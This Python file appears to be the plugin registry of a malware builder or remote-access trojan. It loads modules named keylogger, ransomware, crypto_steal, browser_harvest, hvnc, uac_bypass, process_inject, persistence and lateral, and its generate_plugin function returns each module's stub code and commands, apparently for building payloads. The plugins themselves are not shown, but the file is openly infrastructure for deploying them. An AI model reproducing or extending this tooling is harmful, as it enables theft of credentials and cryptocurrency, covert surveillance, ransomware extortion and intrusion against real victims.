import os, importlib, pkgutil, sys

PLUGIN_REGISTRY = {}

_PLUGIN_NAMES = [
    "anti_vm", "browser_harvest", "clipboard", "crypto_clipper", "crypto_steal",
    "dns_hijack", "file_hunter", "file_manager", "hvnc", "keylogger",
    "lateral", "persistence", "process_inject", "ransomware", "screenshot",
    "shell", "uac_bypass", "vuln_scan", "webcam", "wifi_harvest",
]

def _load():
    if getattr(sys, 'frozen', False):
        names = _PLUGIN_NAMES
    else:
        pkg_dir = os.path.dirname(__file__)
        names = []
        for _, modname, _ in pkgutil.iter_modules([pkg_dir]):
            if not modname.startswith("_"): names.append(modname)
    for modname in names:
        try:
            mod = importlib.import_module(f".{modname}", __package__)
            if hasattr(mod, "PLUGIN"):
                PLUGIN_REGISTRY[modname] = mod
        except: pass
    return PLUGIN_REGISTRY

PLUGIN_REGISTRY = _load()

def get_info():
    return {n: {"name": m.PLUGIN["name"], "desc": m.PLUGIN["desc"], "deps": m.PLUGIN.get("deps", []), "size": m.PLUGIN.get("size", 0)} for n, m in PLUGIN_REGISTRY.items()}

def generate_plugin(modname):
    mod = PLUGIN_REGISTRY.get(modname)
    if not mod: return "", {}
    code = getattr(mod, "STUB_CODE", "")
    cmds = mod.get_commands() if hasattr(mod, "get_commands") else {}
    return code, cmds
